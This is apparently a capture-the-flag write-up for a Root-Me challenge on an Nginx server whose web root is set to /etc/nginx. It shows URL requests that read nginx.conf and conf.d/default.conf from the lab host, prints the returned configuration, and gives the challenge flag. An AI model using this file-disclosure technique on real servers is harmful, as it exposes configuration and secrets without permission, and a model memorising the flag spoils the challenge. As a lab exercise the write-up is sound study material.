---
layout: default
title: Nginx-Root-Location-Misconfiguration
---

I searched in google and found this [common ngnix misconfigurations](https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/), and there I could see that these lines:
```
server {
    listen       80;
    server_name  _;
    root /etc/nginx;
```
sets the `root` folder to `/etc/nginx`. This means that if we asks for example for `/nginx.conf`, we bascilly asks for this path: `/etc/nginx/nginx.conf`.

Let's try it:
`http://challenge01.root-me.org:59093/nginx.conf`

I'm getting:
```

user  nginx;
worker_processes  auto;

error_log  /var/log/nginx/error.log notice;
pid        /var/run/nginx.pid;


events {
    worker_connections  1024;
}


http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;
    #tcp_nopush     on;

    keepalive_timeout  65;

    #gzip  on;

    include /etc/nginx/conf.d/default.conf;
}
```
Let's try getting this: `conf.d/default.conf`, by accessing this url: `http://challenge01.root-me.org:59093/conf.d/default.conf`

Yay, the flag is there.

**Flag:** ***`RM{b3_C4r3fU1_ab0uT_R00t_L0cat1on<3}`***
